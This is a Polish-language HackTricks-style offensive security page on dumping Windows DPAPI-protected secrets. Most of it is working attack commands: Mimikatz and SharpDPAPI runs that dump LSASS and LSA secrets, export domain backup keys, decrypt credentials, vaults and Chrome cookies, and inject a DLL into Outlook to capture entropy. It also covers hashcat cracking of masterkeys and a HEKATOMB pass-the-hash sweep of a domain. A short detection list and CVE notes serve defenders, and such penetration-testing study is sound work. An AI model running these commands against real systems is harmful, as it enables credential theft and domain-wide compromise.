# DPAPI - Ekstrakcja Haseł

{{#include ../../banners/hacktricks-training.md}}



## Czym jest DPAPI

Data Protection API (DPAPI) jest głównie wykorzystywane w systemie operacyjnym Windows do **symmetric encryption of asymmetric private keys**, wykorzystując jako istotne źródło entropii sekrety użytkownika lub systemu. Takie podejście upraszcza szyfrowanie dla programistów, umożliwiając im szyfrowanie danych za pomocą klucza pochodzącego z sekretów logowania użytkownika lub, w przypadku szyfrowania systemowego, sekretów uwierzytelniania domeny systemu, eliminując w ten sposób potrzebę zarządzania ochroną klucza szyfrującego przez programistów.

Najczęstszym sposobem użycia DPAPI jest korzystanie z funkcji **`CryptProtectData` i `CryptUnprotectData`**, które pozwalają aplikacjom na bezpieczne szyfrowanie i deszyfrowanie danych z sesji procesu, który jest aktualnie zalogowany. Oznacza to, że zaszyfrowane dane mogą być odszyfrowane tylko przez tego samego użytkownika lub system, który je zaszyfrował.

Ponadto, te funkcje akceptują również parametr **`entropy`**, który będzie używany podczas szyfrowania i deszyfrowania, dlatego aby odszyfrować coś zaszyfrowanego przy użyciu tego parametru, musisz podać tę samą wartość entropii, która była używana podczas szyfrowania.

### Generowanie kluczy użytkowników

DPAPI generuje unikalny klucz (nazywany **`pre-key`**) dla każdego użytkownika na podstawie jego poświadczeń. Klucz ten jest pochodną hasła użytkownika i innych czynników, a algorytm zależy od typu użytkownika, ale kończy się na SHA1. Na przykład, dla użytkowników domenowych, **zależy od hasha HTLM użytkownika**.

To jest szczególnie interesujące, ponieważ jeśli atakujący może uzyskać hash hasła użytkownika, może:

- **Odszyfrować wszelkie dane, które zostały zaszyfrowane przy użyciu DPAPI** z kluczem tego użytkownika bez potrzeby kontaktowania się z jakimkolwiek API
- Spróbować **złamać hasło** offline, próbując wygenerować ważny klucz DPAPI

Ponadto, za każdym razem, gdy dane są szyfrowane przez użytkownika przy użyciu DPAPI, generowany jest nowy **klucz główny**. Ten klucz główny jest tym, który jest faktycznie używany do szyfrowania danych. Każdy klucz główny jest przypisany z **GUID** (Globally Unique Identifier), który go identyfikuje.

Klucze główne są przechowywane w katalogu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gdzie `{SID}` to identyfikator zabezpieczeń tego użytkownika. Klucz główny jest przechowywany zaszyfrowany kluczem **`pre-key`** użytkownika oraz kluczem **kopii zapasowej domeny** do odzyskiwania (więc ten sam klucz jest przechowywany zaszyfrowany 2 razy przez 2 różne hasła).

Zauważ, że **klucz domeny używany do szyfrowania klucza głównego znajduje się w kontrolerach domeny i nigdy się nie zmienia**, więc jeśli atakujący ma dostęp do kontrolera domeny, może odzyskać klucz kopii zapasowej domeny i odszyfrować klucze główne wszystkich użytkowników w domenie.

Zaszyfrowane bloby zawierają **GUID klucza głównego**, który został użyty do szyfrowania danych wewnątrz jego nagłówków.

> [!TIP]
> Zaszyfrowane bloby DPAPI zaczynają się od **`01 00 00 00`**

Znajdź klucze główne:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
To jest to, jak wygląda zestaw Master Keys użytkownika:

![](<../../images/image (1121).png>)

### Generowanie kluczy maszyny/systemu

Jest to klucz używany przez maszynę do szyfrowania danych. Opiera się na **DPAPI_SYSTEM LSA secret**, który jest specjalnym kluczem, do którego dostęp ma tylko użytkownik SYSTEM. Klucz ten jest używany do szyfrowania danych, które muszą być dostępne dla samego systemu, takich jak poświadczenia na poziomie maszyny lub sekrety systemowe.

Należy zauważyć, że te klucze **nie mają kopii zapasowej w domenie**, więc są dostępne tylko lokalnie:

- **Mimikatz** może uzyskać do nich dostęp, zrzucając sekrety LSA za pomocą polecenia: `mimikatz lsadump::secrets`
- Sekret jest przechowywany w rejestrze, więc administrator może **zmodyfikować uprawnienia DACL, aby uzyskać do niego dostęp**. Ścieżka rejestru to: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Chronione dane przez DPAPI

Wśród danych osobowych chronionych przez DPAPI znajdują się:

- poświadczenia Windows
- hasła i dane autouzupełniania Internet Explorera i Google Chrome
- hasła do kont e-mail i wewnętrznych kont FTP dla aplikacji takich jak Outlook i Windows Mail
- hasła do folderów udostępnionych, zasobów, sieci bezprzewodowych i Windows Vault, w tym klucze szyfrowania
- hasła do połączeń z pulpitem zdalnym, .NET Passport i klucze prywatne do różnych celów szyfrowania i uwierzytelniania
- hasła sieciowe zarządzane przez Menedżera poświadczeń oraz dane osobowe w aplikacjach korzystających z CryptProtectData, takich jak Skype, MSN messenger i inne
- Szyfrowane bloby w rejestrze
- ...

Chronione dane systemowe obejmują:
- hasła WiFi
- hasła zadań zaplanowanych
- ...

### Opcje ekstrakcji klucza głównego

- Jeśli użytkownik ma uprawnienia administratora domeny, może uzyskać dostęp do **klucza kopii zapasowej domeny**, aby odszyfrować wszystkie klucze główne użytkowników w domenie:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Posiadając lokalne uprawnienia administratora, możliwe jest **uzyskanie dostępu do pamięci LSASS**, aby wyodrębnić klucze główne DPAPI wszystkich podłączonych użytkowników oraz klucz SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Jeśli użytkownik ma lokalne uprawnienia administratora, może uzyskać dostęp do **DPAPI_SYSTEM LSA secret**, aby odszyfrować klucze główne maszyny:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Jeśli hasło lub hash NTLM użytkownika jest znane, możesz **bezpośrednio odszyfrować klucze główne użytkownika**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Jeśli jesteś w sesji jako użytkownik, możliwe jest poproszenie DC o **klucz zapasowy do odszyfrowania kluczy głównych za pomocą RPC**. Jeśli jesteś lokalnym administratorem, a użytkownik jest zalogowany, możesz **ukraść jego token sesji** w tym celu:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista skarbców
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Uzyskiwanie dostępu do zaszyfrowanych danych DPAPI

### Znajdź zaszyfrowane dane DPAPI

Typowe **pliki chronione** użytkowników znajdują się w:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Sprawdź również, zmieniając `\Roaming\` na `\Local\` w powyższych ścieżkach.

Przykłady enumeracji:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) może znaleźć zaszyfrowane bloby DPAPI w systemie plików, rejestrze i bloby B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Zauważ, że [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (z tej samej repozytorium) może być użyty do odszyfrowania za pomocą DPAPI wrażliwych danych, takich jak ciasteczka.

### Klucze dostępu i dane

- **Użyj SharpDPAPI**, aby uzyskać poświadczenia z plików zaszyfrowanych przez DPAPI z bieżącej sesji:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Uzyskaj informacje o poświadczeniach** takie jak zaszyfrowane dane i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Uzyskaj dostęp do masterkey**:

Zdejmij szyfrowanie masterkey użytkownika, żądając **klucza kopii zapasowej domeny** za pomocą RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Narzędzie **SharpDPAPI** obsługuje również te argumenty do deszyfrowania masterkey (zauważ, że możliwe jest użycie `/rpc` do uzyskania klucza zapasowego domeny, `/password` do użycia hasła w postaci tekstu jawnego lub `/pvk` do określenia pliku klucza prywatnego domeny DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Deszyfrowanie danych za pomocą klucza głównego**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Narzędzie **SharpDPAPI** obsługuje również te argumenty do deszyfrowania `credentials|vaults|rdg|keepass|triage|blob|ps` (zauważ, że możliwe jest użycie `/rpc`, aby uzyskać klucz zapasowy domeny, `/password`, aby użyć hasła w postaci czystego tekstu, `/pvk`, aby określić plik klucza prywatnego domeny DPAPI, `/unprotect`, aby użyć sesji bieżącego użytkownika...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Odszyfruj dane za pomocą **bieżącej sesji użytkownika**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Obsługa opcjonalnej entropii ("Entropia zewnętrzna")

Niektóre aplikacje przekazują dodatkową wartość **entropii** do `CryptProtectData`. Bez tej wartości blob nie może być odszyfrowany, nawet jeśli znany jest poprawny klucz główny. Uzyskanie entropii jest zatem niezbędne, gdy celem są poświadczenia chronione w ten sposób (np. Microsoft Outlook, niektóre klienty VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) to DLL w trybie użytkownika, która przechwytuje funkcje DPAPI wewnątrz docelowego procesu i przezroczysto rejestruje wszelką opcjonalną entropię, która jest dostarczana. Uruchomienie EntropyCapture w trybie **DLL-injection** przeciwko procesom takim jak `outlook.exe` lub `vpnclient.exe` wygeneruje plik mapujący każdy bufor entropii do wywołującego procesu i blobu. Przechwycona entropia może być później dostarczona do **SharpDPAPI** (`/entropy:`) lub **Mimikatz** (`/entropy:<file>`), aby odszyfrować dane.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft wprowadził format masterkey **context 3** począwszy od Windows 10 v1607 (2016). `hashcat` v6.2.6 (grudzień 2023) dodał tryby haszowania **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), umożliwiając przyspieszone przez GPU łamanie haseł użytkowników bezpośrednio z pliku masterkey. Atakujący mogą zatem przeprowadzać ataki słownikowe lub brute-force bez interakcji z systemem docelowym.

`DPAPISnoop` (2024) automatyzuje ten proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Narzędzie może również analizować bloby Credential i Vault, odszyfrować je za pomocą złamanych kluczy i eksportować hasła w postaci tekstu jawnego.

### Uzyskiwanie dostępu do danych z innych maszyn

W **SharpDPAPI i SharpChrome** możesz wskazać opcję **`/server:HOST`**, aby uzyskać dostęp do danych zdalnej maszyny. Oczywiście musisz mieć możliwość dostępu do tej maszyny, a w poniższym przykładzie zakłada się, że **klucz szyfrowania kopii zapasowej domeny jest znany**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Inne narzędzia

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) to narzędzie, które automatyzuje ekstrakcję wszystkich użytkowników i komputerów z katalogu LDAP oraz ekstrakcję klucza zapasowego kontrolera domeny przez RPC. Skrypt następnie rozwiązuje adresy IP wszystkich komputerów i wykonuje smbclient na wszystkich komputerach, aby odzyskać wszystkie DPAPI blobs wszystkich użytkowników i odszyfrować wszystko za pomocą klucza zapasowego domeny.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Z listy komputerów wyekstrahowanej z LDAP możesz znaleźć każdą podsieć, nawet jeśli ich nie znałeś!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) może automatycznie zrzucać sekrety chronione przez DPAPI. Wersja 2.x wprowadziła:

* Równoległe zbieranie blobs z setek hostów
* Parsowanie **context 3** masterkeys i automatyczną integrację z Hashcat
* Wsparcie dla zaszyfrowanych ciasteczek "App-Bound" w Chrome (patrz następna sekcja)
* Nowy tryb **`--snapshot`**, aby wielokrotnie sprawdzać punkty końcowe i porównywać nowo utworzone blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) to parser C# dla plików masterkey/credential/vault, który może wyprowadzać formaty Hashcat/JtR i opcjonalnie automatycznie uruchamiać łamanie. W pełni obsługuje formaty masterkey dla maszyn i użytkowników do Windows 11 24H1.


## Wspólne wykrycia

- Dostęp do plików w `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i innych katalogach związanych z DPAPI.
- Szczególnie z udziału sieciowego, takiego jak **C$** lub **ADMIN$**.
- Użycie **Mimikatz**, **SharpDPAPI** lub podobnych narzędzi do uzyskania dostępu do pamięci LSASS lub zrzutu masterkeys.
- Wydarzenie **4662**: *Operacja została wykonana na obiekcie* – może być skorelowane z dostępem do obiektu **`BCKUPKEY`**.
- Wydarzenie **4673/4674**, gdy proces żąda *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Luki i zmiany w ekosystemie 2023-2025

* **CVE-2023-36004 – Oszustwo kanału zabezpieczeń DPAPI w Windows** (listopad 2023). Atakujący z dostępem do sieci mógłby oszukać członka domeny, aby pobrał złośliwy klucz zapasowy DPAPI, co pozwala na odszyfrowanie masterkeys użytkowników. Poprawione w listopadowej aktualizacji zbiorczej 2023 – administratorzy powinni upewnić się, że DC i stacje robocze są w pełni załatane.
* **Szyfrowanie ciasteczek "App-Bound" w Chrome 127** (lipiec 2024) zastąpiło starszą ochronę tylko DPAPI dodatkowym kluczem przechowywanym w **Credential Manager** użytkownika. Offline odszyfrowanie ciasteczek teraz wymaga zarówno masterkey DPAPI, jak i **klucza związane z aplikacją w formacie GCM**. SharpChrome v2.3 i DonPAPI 2.x są w stanie odzyskać dodatkowy klucz, gdy działają w kontekście użytkownika.


## Odnośniki

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
